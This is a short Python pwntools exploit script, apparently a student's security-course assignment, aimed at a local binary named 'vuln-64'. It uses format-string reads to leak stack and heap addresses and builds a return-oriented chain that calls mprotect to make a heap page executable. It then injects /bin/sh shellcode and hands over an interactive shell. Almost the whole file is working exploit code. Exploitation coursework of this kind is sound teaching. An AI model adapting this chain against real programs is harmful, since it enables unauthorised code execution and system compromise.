# Maximiliano brizzio
# I pledge my honor that I have abided by the Stevens Honor System.

from pwn import *

context(os='linux', arch='amd64')
io = process('./vuln-64')

#leaking vuln_func return address
io.sendline(b'%11$p')
vfunc_ret_addr = int(io.recvline(), 16)


#getting mprotect address
libc = io.libs()['/usr/lib/x86_64-linux-gnu/libc.so.6']
mprotect = libc + 0x1010f0

#ROP gadgets
pop_rdi = libc + 0x27c65
pop_rsi = libc + 0x29419
pop_rdx = libc + 0xfd6bd
stack_piv_offset = 2
stack_pivot = vfunc_ret_addr + stack_piv_offset

io.recvline()
io.recvline()

# leaking heap_page address
io.sendline(b'%5$p')
heap_ref = io.recvline()
sc_start = int(heap_ref, 16) + 64
heap_page = int(heap_ref[:-4] + b'000', 16)

#setting up args for mprotect
rdi = heap_page
rsi = 4096
rdx = 7

#creating null-free shellcode, then adding exit syscall
sc = shellcraft.amd64.linux.sh()
sc += 'xor rax, rax\n mov al, 0x3c\n xor rdx, rdx\n syscall'

#with added shellcode, offset changes by 58 bytes
offset = b'A' * 22 #80 - 58 = 22

exploit = bytearray(pop_rdi.to_bytes(8, byteorder='little'))
exploit.extend(rdi.to_bytes(8, byteorder='little'))
exploit.extend(pop_rsi.to_bytes(8, byteorder='little'))
exploit.extend(rsi.to_bytes(8, byteorder='little'))
exploit.extend(pop_rdx.to_bytes(8, byteorder='little'))
exploit.extend(rdx.to_bytes(8, byteorder='little'))
exploit.extend(mprotect.to_bytes(8, byteorder='little'))
exploit.extend(sc_start.to_bytes(8, byteorder='little'))
exploit.extend(asm(sc))
exploit.extend(offset)
exploit.extend(stack_pivot.to_bytes(8, byteorder='little'))

print("payload: ", exploit)
io.recvline()
io.recvline()
io.sendline(exploit)
time.sleep(1)

io.interactive()
io.close()

